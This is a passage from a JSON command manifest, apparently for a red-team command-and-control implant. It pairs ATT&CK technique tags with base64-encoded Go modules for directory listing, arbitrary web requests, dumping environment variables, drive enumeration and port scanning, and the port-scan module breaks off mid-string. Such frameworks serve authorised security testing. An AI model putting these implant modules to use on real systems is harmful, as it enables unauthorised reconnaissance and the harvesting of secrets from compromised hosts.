ZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewogIHZhciByb3dzID0gW107CiAgZm9yKHZhciBpID0gMDsgaSA8IHJlc3BvbnNlLmxlbmd0aDsgaSsrKXsKICAgIHRyeXsKICAgICAgICB2YXIgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VbaV1bJ3Jlc3BvbnNlJ10pOwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4gcmVzcG9uc2U7CiAgICB9CiAgIHZhciByb3dfc3R5bGUgPSAiIjsKICAgdmFyIGNlbGxfc3R5bGUgPSB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidHlwZSI6InRleHQtYWxpZ246Y2VudGVyIn07CiAgICAKICAgIGRhdGFbJ2VudHJpZXMnXS5mb3JFYWNoKGZ1bmN0aW9uKHIpewogICAgICB2YXIgcm93X3N0eWxlID0gIiI7CiAgICAgIGlmIChyWyJJc0RpciJdKSB7IHJvd19zdHlsZSA9ICJiYWNrZ3JvdW5kLWNvbG9yOiAjNUUyOERDIjsgfQogICAgICByb3dzLnB1c2goeyJGaWxlbmFtZSI6IHJbJ0ZpbGVuYW1lJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgIlNpemUiOiByWydTaXplJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgIlBlcm1pc3Npb25zIjogclsnUGVybWlzc2lvbnMnXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAiTGFzdG1vZGlmaWVkIjogclsnTGFzdG1vZGlmaWVkJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJJc0RpciI6IHJbJ0lzRGlyJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjoge30KICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgfSk7CiAgfQogIHZhciBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJGaWxlbmFtZSIsICJzaXplIjoiMTBlbSJ9LHsibmFtZSI6IlNpemUiLCAic2l6ZSI6IjJlbSJ9LCB7Im5hbWUiOiJQZXJtaXNzaW9ucyIsICJzaXplIjoiMmVtIn0seyJuYW1lIjoiTGFzdG1vZGlmaWVkIiwic2l6ZSI6IjNlbSJ9ICx7Im5hbWUiOiAiSXNEaXIiLCAic2l6ZSI6ICIyZW0ifV0sIHJvd3MpOwogIHJldHVybiBvdXRwdXQ7Cn0="
        },
        {
          "needs_admin": false,
          "help_cmd": "",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "List killable jobs.",
          "cmd": "jobs",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "curl {  \"url\": \"https:\/\/www.google.com\",  \"method\": \"GET\",  \"headers\": \"\",  \"body\": \"\" }",
          "version": 6,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Execute a single web request",
          "cmd": "curl",
          "parameters": [
            {
              "type": "String",
              "hint": "base64 encoded body",
              "choices": "",
              "required": false,
              "name": "body"
            },
            {
              "type": "String",
              "hint": "base64 encoded json with headers",
              "choices": "",
              "required": false,
              "name": "headers"
            },
            {
              "type": "String",
              "hint": "GET",
              "choices": "",
              "required": true,
              "name": "method"
            },
            {
              "type": "String",
              "hint": "https:\/\/www.google.com",
              "choices": "",
              "required": true,
              "name": "url"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "curl.go": "cGFja2FnZSBjdXJsCgppbXBvcnQgKAoJImVuY29kaW5nL2pzb24iCgkiZW5jb2RpbmcvYmFzZTY0IgoJInN5bmMiCgkiYnl0ZXMiCgkicGtnL3Byb2ZpbGVzIgoJIm5ldC9odHRwIgoJImlvL2lvdXRpbCIKCSJ0aW1lIgoJInN0cmluZ3MiCgoJInBrZy91dGlscy9zdHJ1Y3RzIgopCgp2YXIgbXUgc3luYy5NdXRleAoKdHlwZSBBcmd1bWVudHMgc3RydWN0IHsKCVVybCBzdHJpbmcgYGpzb246InVybCJgCglNZXRob2Qgc3RyaW5nIGBqc29uOiJtZXRob2QiYAoJQm9keSBzdHJpbmcgYGpzb246ImJvZHkiYAoJSGVhZGVycyBzdHJpbmcgYGpzb246ImhlYWRlcnMiYAp9CgovL1J1biAtIEZ1bmN0aW9uIHRoYXQgZXhlY3V0ZXMgYSBjdXJsIGNvbW1hbmQgd2l0aCBHb2xhbmcgQVBJcwpmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECglhcmdzIDo9ICZBcmd1bWVudHN7fQoJZXJyIDo9IGpzb24uVW5tYXJzaGFsKFtdYnl0ZSh0YXNrLlBhcmFtcyksIGFyZ3MpCgoJaWYgZXJyICE9IG5pbCB7CgkJCgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCXZhciBib2R5IFtdYnl0ZQoJdmFyIHJhd0hlYWRlcnMgW11ieXRlCgoJaWYgbGVuKGFyZ3MuQm9keSkgPiAwIHsKCQlib2R5LCBfID0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhhcmdzLkJvZHkpCgl9CgoJaWYgbGVuKGFyZ3MuSGVhZGVycykgPiAwIHsKCQlyYXdIZWFkZXJzLCBfID0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhhcmdzLkhlYWRlcnMpCgl9CgoJY2xpZW50IDo9ICZodHRwLkNsaWVudHsKCQlUaW1lb3V0OiAzMCAqIHRpbWUuU2Vjb25kLAoJfQoKCXZhciByZXNwQm9keSBbXWJ5dGUKCXZhciByZXEgKmh0dHAuUmVxdWVzdAoJaWYgbGVuKGJvZHkpID4gMCB7CgkJcmVxLCBfID0gaHR0cC5OZXdSZXF1ZXN0KGFyZ3MuTWV0aG9kLCBhcmdzLlVybCwgYnl0ZXMuTmV3QnVmZmVyKGJvZHkpKQkKCX0gZWxzZSB7CgkJcmVxLCBfID0gaHR0cC5OZXdSZXF1ZXN0KGFyZ3MuTWV0aG9kLCBhcmdzLlVybCwgbmlsKQoJfQoJCgoJaWYgbGVuKHJhd0hlYWRlcnMpID4gMCB7CgkJdmFyIGhlYWRlcnMgbWFwW3N0cmluZ11pbnRlcmZhY2V7fQoJCV8gPSBqc29uLlVubWFyc2hhbChyYXdIZWFkZXJzLCAmaGVhZGVycykKCgkJZm9yIGssIHYgOj0gcmFuZ2UgaGVhZGVycyB7CgkJCWlmIHN0cmluZ3MuQ29udGFpbnMoaywgIkhvc3QiKSB7CgkJCQlyZXEuSG9zdCA9IHYuKHN0cmluZykKCQkJfSBlbHNlIHsKCQkJCXJlcS5IZWFkZXIuU2V0KGssIHYuKHN0cmluZykpCgkJCX0KCQl9Cgl9CgoJcmVzcCwgZXJyIDo9IGNsaWVudC5EbyhyZXEpCglpZiBlcnIgIT0gbmlsIHsKCQkKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJZGVmZXIgcmVzcC5Cb2R5LkNsb3NlKCkKCXJlc3BCb2R5LCBlcnIgPSBpb3V0aWwuUmVhZEFsbChyZXNwLkJvZHkpCgoJaWYgZXJyICE9IG5pbCB7CgkJCgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgltc2cuVXNlck91dHB1dCA9IHN0cmluZyhyZXNwQm9keSkKCXIsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "getenv",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Get all of the current environment variables.",
          "cmd": "getenv",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "getenv.go": "cGFja2FnZSBnZXRlbnYKCmltcG9ydCAoCgkib3MiCgkic3RyaW5ncyIKCSJlbmNvZGluZy9qc29uIgoJInBrZy91dGlscy9zdHJ1Y3RzIgoJInN5bmMiCgkicGtnL3Byb2ZpbGVzIgopCgp2YXIgbXUgc3luYy5NdXRleAoKLy9SdW4gLSBGdW5jdGlvbiB0aGF0IGV4ZWN1dGVzIHRoZSBzaGVsbCBjb21tYW5kCmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7Cgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCW1zZy5Vc2VyT3V0cHV0ID0gc3RyaW5ncy5Kb2luKG9zLkVudmlyb24oKSwgIlxuIikKCW1zZy5Db21wbGV0ZWQgPSB0cnVlIAoKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "drives",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Get information about mounted drives",
          "cmd": "drives",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1135",
              "attack_name": "Network Share Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "drives_nix.go": "Ly8gK2J1aWxkIGxpbnV4IGRhcndpbgoKcGFja2FnZSBkcml2ZXMKCmltcG9ydCAoCgkiaW8vaW91dGlsIgoJIm9zIgoJInBhdGgiCgkic3lzY2FsbCIKCgkicGtnL3V0aWxzL2Z1bmN0aW9ucyIKKQoKZnVuYyBnZXREcml2ZShwYXRoIHN0cmluZykgRHJpdmUgewoJdmFyIHN0YXQgc3lzY2FsbC5TdGF0ZnNfdAoJc3lzY2FsbC5TdGF0ZnMocGF0aCwgJnN0YXQpCgkvLyBBdmFpbGFibGUgYmxvY2tzICogc2l6ZSBwZXIgYmxvY2sgPSBhdmFpbGFibGUgc3BhY2UgaW4gYnl0ZXMKCS8vIGZtdC5QcmludGxuKHN0YXQuQmF2YWlsICogdWludDY0KHN0YXQuQnNpemUpKQoJZnJlZUJ5dGVzIDo9IHN0YXQuQmF2YWlsICogdWludDY0KHN0YXQuQnNpemUpCgl0b3RhbEJ5dGVzIDo9IHN0YXQuQmxvY2tzICogdWludDY0KHN0YXQuQnNpemUpCglmcmVlQnl0ZXNQcmV0dHkgOj0gZnVuY3Rpb25zLlVJTlQ2NEJ5dGVDb3VudERlY2ltYWwoZnJlZUJ5dGVzKQoJdG90YWxCeXRlc1ByZXR0eSA6PSBmdW5jdGlvbnMuVUlOVDY0Qnl0ZUNvdW50RGVjaW1hbCh0b3RhbEJ5dGVzKQoJcmV0dXJuIERyaXZlewoJCU5hbWU6ICAgICAgICAgICAgIHBhdGgsCgkJRGVzY3JpcHRpb246ICAgICAgIiIsCgkJRnJlZUJ5dGVzOiAgICAgICAgc3RhdC5CYXZhaWwgKiB1aW50NjQoc3RhdC5Cc2l6ZSksCgkJVG90YWxCeXRlczogICAgICAgc3RhdC5CbG9ja3MgKiB1aW50NjQoc3RhdC5Cc2l6ZSksCgkJRnJlZUJ5dGVzUHJldHR5OiAgZnJlZUJ5dGVzUHJldHR5LAoJCVRvdGFsQnl0ZXNQcmV0dHk6IHRvdGFsQnl0ZXNQcmV0dHksCgl9Cn0KCmZ1bmMgbGlzdERyaXZlcygpIChbXURyaXZlLCBlcnJvcikgewoJdmFyIGRyaXZlcyBbXURyaXZlCglkcml2ZXMgPSBhcHBlbmQoZHJpdmVzLCBnZXREcml2ZSgiLyIpKQoKCV8sIGVyciA6PSBvcy5TdGF0KCIvbW50LyIpCglpZiBlcnIgPT0gbmlsIHsKCQlmaWxlcywgZXJyIDo9IGlvdXRpbC5SZWFkRGlyKCIvbW50LyIpCgkJaWYgZXJyID09IG5pbCB7CgkJCWZvciBfLCBmIDo9IHJhbmdlIGZpbGVzIHsKCQkJCWZwIDo9IHBhdGguSm9pbigiL21udC8iLCBmLk5hbWUoKSkKCQkJCWRyaXZlcyA9IGFwcGVuZChkcml2ZXMsIGdldERyaXZlKGZwKSkKCQkJfQoJCX0KCX0KCglfLCBlcnIgPSBvcy5TdGF0KCIvVm9sdW1lcy8iKQoJaWYgZXJyID09IG5pbCB7CgkJZmlsZXMsIGVyciA6PSBpb3V0aWwuUmVhZERpcigiL1ZvbHVtZXMvIikKCQlpZiBlcnIgPT0gbmlsIHsKCQkJZm9yIF8sIGYgOj0gcmFuZ2UgZmlsZXMgewoJCQkJZnAgOj0gcGF0aC5Kb2luKCIvVm9sdW1lcy8iLCBmLk5hbWUoKSkKCQkJCWRyaXZlcyA9IGFwcGVuZChkcml2ZXMsIGdldERyaXZlKGZwKSkKCQkJfQoJCX0KCX0KCXJldHVybiBkcml2ZXMsIG5pbAp9Cg=="
            },
            {
              "drives.go": "cGFja2FnZSBkcml2ZXMKCmltcG9ydCAoCgkiZW5jb2RpbmcvanNvbiIKCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkic3luYyIKCSJwa2cvcHJvZmlsZXMiCikKCnZhciBtdSBzeW5jLk11dGV4Cgp0eXBlIERyaXZlIHN0cnVjdCB7CglOYW1lICAgICAgICAgICAgIHN0cmluZyBganNvbjoibmFtZSJgCglEZXNjcmlwdGlvbiAgICAgIHN0cmluZyBganNvbjoiZGVzY3JpcHRpb24iYAoJRnJlZUJ5dGVzICAgICAgICB1aW50NjQgYGpzb246ImZyZWVfYnl0ZXMiYAoJVG90YWxCeXRlcyAgICAgICB1aW50NjQgYGpzb246InRvdGFsX2J5dGVzImAKCUZyZWVCeXRlc1ByZXR0eSAgc3RyaW5nIGBqc29uOiJmcmVlX2J5dGVzX3ByZXR0eSJgCglUb3RhbEJ5dGVzUHJldHR5IHN0cmluZyBganNvbjoidG90YWxfYnl0ZXNfcHJldHR5ImAKfQoKLy9SdW4gLSBGdW5jdGlvbiB0aGF0IGV4ZWN1dGVzIHRoZSBzaGVsbCBjb21tYW5kCmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7Cgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCQoKCXJlcywgZXJyIDo9IGxpc3REcml2ZXMoKQoKCWlmIGVyciAhPSBuaWwgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglkcml2ZUpzb24sIGVyciA6PSBqc29uLk1hcnNoYWxJbmRlbnQocmVzLCAiIiwgIiAgICAiKQoJbXNnLlVzZXJPdXRwdXQgPSBzdHJpbmcoZHJpdmVKc29uKQoJbXNnLkNvbXBsZXRlZCA9IHRydWUKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Print the working directory.",
          "cmd": "pwd",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "pwd.go": "cGFja2FnZSBwd2QKCmltcG9ydCAoCgkib3MiCgoJInBrZy91dGlscy9zdHJ1Y3RzIgoJInN5bmMiCgkicGtnL3Byb2ZpbGVzIgoJImVuY29kaW5nL2pzb24iCikKCnZhciBtdSBzeW5jLk11dGV4CgovL1J1biAtIGludGVyZmFjZSBtZXRob2QgdGhhdCByZXRyaWV2ZXMgYSBwcm9jZXNzIGxpc3QKZnVuYyBSdW4odGFzayBzdHJ1Y3RzLlRhc2spIHsKCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoKCWRpciwgZXJyIDo9IG9zLkdldHdkKCkKCglpZiBlcnIgIT0gbmlsIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CiAgICBtc2cuQ29tcGxldGVkID0gdHJ1ZQoJbXNnLlVzZXJPdXRwdXQgPSBkaXIKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "",
          "version": 5,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Scan host(s) for open ports.",
          "cmd": "portscan",
          "parameters": [
            {
              "type": "String",
              "hint": "List of ports to scan. Can use the dash separator to specify a range.",
              "choices": "",
              "required": true,
              "name": "ports"
            },
            {
              "type": "Array",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "hosts"
            }
          ],
          "attack": [
            {
              "t_num": "T1046",
              "attack_name": "Network Service Scanning"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "scanutils.go": "cGFja2FnZSBwb3J0c2NhbgoKaW1wb3J0ICgKCSJjb250ZXh0IgoJImZtdCIKCSJuZXQiCgkic3RyY29udiIKCSJzdHJpbmdzIgoJInN5bmMiCgkidGltZSIKCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkiZ29sYW5nLm9yZy94L3N5bmMvc2VtYXBob3JlIgopCgp0eXBlIFBvcnRSYW5nZSBzdHJ1Y3QgewoJU3RhcnQgaW50CglFbmQgICBpbnQKfQoKdHlwZSBob3N0IHN0cnVjdCB7CglJUHY0ICAgICAgIHN0cmluZyBganNvbjoiaXB2NCJgCglIb3N0bmFtZSAgIHN0cmluZyBganNvbjoiaG9zdG5hbWUiYAoJUHJldHR5TmFtZSBzdHJpbmcgYGpzb246InByZXR0eV9uYW1lImAKCU9wZW5Qb3J0cyAgW11pbnQgIGBqc29uOiJvcGVuX3BvcnRzImAKCW11dGV4ICAgICAgc3luYy5NdXRleAoJbG9jayAgICAgICAqc2VtYXBob3JlLldlaWdodGVkCn0KCnR5cGUgQ0lEUiBzdHJ1Y3QgewoJUmFuZ2Ugc3RyaW5nICBganNvbjoicmFuZ2UiYAoJSG9zdHMgW10qaG9zdCBganNvbjoiaG9zdHMiYAp9CgovLyBIZWxwZXIgZnVuY3Rpb24gdG8gdmFsaWRhdGUgSVB2NApmdW5jIFZhbGlkSVB2NChob3N0IHN0cmluZykgYm9vbCB7CglwYXJ0cyA6PSBzdHJpbmdzLlNwbGl0KGhvc3QsICIuIikKCglpZiBsZW4ocGFydHMpIDwgNCB7CgkJcmV0dXJuIGZhbHNlCgl9CgoJZm9yIF8sIHggOj0gcmFuZ2UgcGFydHMgewoJCWlmIGksIGVyciA6PSBzdHJjb252LkF0b2koeCk7IGVyciA9PSBuaWwgewoJCQlpZiBpIDwgMCB8fCBpID4gMjU1IHsKCQkJCXJldHVybiBmYWxzZQoJCQl9CgkJfSBlbHNlIHsKCQkJcmV0dXJuIGZhbHNlCgkJfQoKCX0KCXJldHVybiB0cnVlCn0KCi8vIFZhbGlkYXRlcyB0aGF0IGEgbmV3IGhvc3QgY2FuIGJlIGNyZWF0ZWQgYmFzZWQgb24gaG9zdE5hbWUKZnVuYyBOZXdIb3N0KGhvc3ROYW1lIHN0cmluZykgKCpob3N0LCBlcnJvcikgewoJbXR4IDo9IHN5bmMuTXV0ZXh7fQoJaWYgVmFsaWRJUHY0KGhvc3ROYW1lKSB7CgkJcmV0dXJuICZob3N0ewoJCQlJUHY0OiAgICAgICBob3N0TmFtZSwKCQkJUHJldHR5TmFtZTogaG9zdE5hbWUsCgkJCW11dGV4OiAgICAgIG10eCwKCQkJbG9jazogICAgICAgc2VtYXBob3JlLk5ld1dlaWdodGVkKDEwMCksIC8vIHllYWggaSBoYXJkY29kZWQgZG9uJ3QgQG1lCgkJfSwgbmlsCgl9IGVsc2UgewoJCS8vIFRyeSBhbmQgbG9va3VwIHRoZSBob3N0bmFtZQoJCWlwcywgZXJyIDo9IG5ldC5Mb29rdXBJUChob3N0TmFtZSkKCQlpZiBlcnIgIT0gbmlsIHsKCQkJcmV0dXJuIG5pbCwgZXJyCgkJfQoJCWhvc3RTdHIgOj0gZm10LlNwcmludGYoIiVzICglcykiLCBpcHNbMF0uU3RyaW5nKCksIGhvc3ROYW1lKQoJCXJldHVybiAmaG9zdHsKCQkJSVB2NDogICAgICAgaXBzWzBdLlN0cmluZygpLAoJCQlIb3N0bmFtZTogICBob3N0TmFtZSwKCQkJUHJldHR5TmFtZTogaG9zdFN0ciwKCQkJbXV0ZXg6ICAgICAgbXR4LAoJCQlsb2NrOiAgICAgICBzZW1hcGhvcmUuTmV3V2VpZ2h0ZWQoMTAwKSwKCQl9LCBuaWwKCX0KfQoKZnVuYyBOZXdDSURSKGNpZHJTdHIgc3RyaW5nKSAoKkNJRFIsIGVycm9yKSB7CglpcCwgaXBuZXQsIGVyciA6PSBuZXQuUGFyc2VDSURSKGNpZHJTdHIpCgl2YXIgaG9zdHMgW10qaG9zdAoJLy8gTWF5YmUgc2luZ2xlIElQIGdpdmVuPwoJaWYgZXJyICE9IG5pbCB7CgkJaG9zdEluc3QsIGVyciA6PSBOZXdIb3N0KGNpZHJTdHIpCgkJLy8gRmFpbGVkIHRvIHBhcnNlIHRoZSBzaW5nbGUgaXAuIEZhaWwgb3V0LgoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gbmlsLCBlcnIKCQl9CgkJaG9zdHMgPSBhcHBlbmQoaG9zdHMsIGhvc3RJbnN0KQoJfSBlbHNlIHsKCQl2YXIgaXBzIFtdc3RyaW5nCgkJZm9yIGlwIDo9IGlwLk1hc2soaXBuZXQuTWFzayk7IGlwbmV0LkNvbnRhaW5zKGlwKTsgaW5jKGlwKSB7CgkJCWlwcyA9IGFwcGVuZChpcHMsIGlwLlN0cmluZygpKQoJCX0KCQkvLyByZW1vdmUgbmV0d29yayBhZGRyZXNzIGFuZCBicm9hZGNhc3QgYWRkcmVzcwoJCWZvciBpIDo9IDE7IGkgPCBsZW4oaXBzKS0xOyBpKysgewoJCQlob3N0SW5zdCwgZXJyIDo9IE5ld0hvc3QoaXBzW2ldKQoJCQlpZiBlcnIgIT0gbmlsIHsKCQkJCXJldHVybiBuaWwsIGVycgoJCQl9CgkJCWhvc3RzID0gYXBwZW5kKGhvc3RzLCBob3N0SW5zdCkKCQl9Cgl9CglyZXR1cm4gJkNJRFJ7CgkJUmFuZ2U6IGNpZHJTdHIsCgkJSG9zdHM6IGhvc3RzLAoJfSwgbmlsCn0KCi8vICBodHRwOi8vcGxheS5nb2xhbmcub3JnL3AvbThUTlR0eWdLMApmdW5jIGluYyhpcCBuZXQuSVApIHsKCWZvciBqIDo9IGxlbihpcCkgLSAxOyBqID49IDA7IGotLSB7CgkJaXBbal0rKwoJCWlmIGlwW2pdID4gMCB7CgkJCWJyZWFrCgkJfQoJfQp9CgovLyBTY2FuIGEgc2luZ2xlIHBvcnQhCi8vZXhwb3J0CmZ1bmMgKHNlcnZlciAqaG9zdCkgU2NhblBvcnQocG9ydCBpbnQsIHRpbWVvdXQgdGltZS5EdXJhdGlvbikgewoJdGFyZ2V0IDo9IGZtdC5TcHJpbnRmKCIlczolZCIsIHNlcnZlci5JUHY0LCBwb3J0KQoJY29ubiwgZXJyIDo9IG5ldC5EaWFsVGltZW91dCgidGNwIiwgdGFyZ2V0LCB0aW1lb3V0KQoKCWlmIGNvbm4gIT0gbmlsIHsKCQljb25uLkNsb3NlKCkKCX0KCglpZiBlcnIgIT0gbmlsIHsKCQlpZiBzdHJpbmdzLkNvbnRhaW5zKGVyci5FcnJvcigpLCAidG9vIG1hbnkgb3BlbiBmaWxlcyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoZXJyLkVycm9yKCksICJ0ZW1wb3JhcmlseSB1bmF2YWlsYWJsZSIpIHsKCQkJdGltZS5TbGVlcCh0aW1lb3V0KQoJCQlzZXJ2ZXIuU2NhblBvcnQocG9ydCwgdGltZW91dCkKCQl9CgkJcmV0dXJuCgl9CglzZXJ2ZXIubXV0ZXguTG9jaygpCglzZXJ2ZXIuT3BlblBvcnRzID0gYXBwZW5kKHNlcnZlci5PcGVuUG9ydHMsIHBvcnQpCglzZXJ2ZXIubXV0ZXguVW5sb2NrKCkKfQoKLy8gU2NhbiBhIHNlcXVlbnRpYWwgcmFuZ2Ugb2YgcG9ydHMKZnVuYyAoc2VydmVyICpob3N0KSBTY2FuUG9ydFJhbmdlKHByIFBvcnRSYW5nZSwgdGltZW91dCB0aW1lLkR1cmF0aW9uKSB7Cgl3ZyA6PSBzeW5jLldhaXRHcm91cHt9CgoJZm9yIHBvcnQgOj0gcHIuU3RhcnQ7IHBvcnQgPD0gcHIuRW5kOyBwb3J0KysgewoJCXNlcnZlci5sb2NrLkFjcXVpcmUoY29udGV4dC5UT0RPKCksIDEpCgkJd2cuQWRkKDEpCgkJZ28gZnVuYyhwb3J0I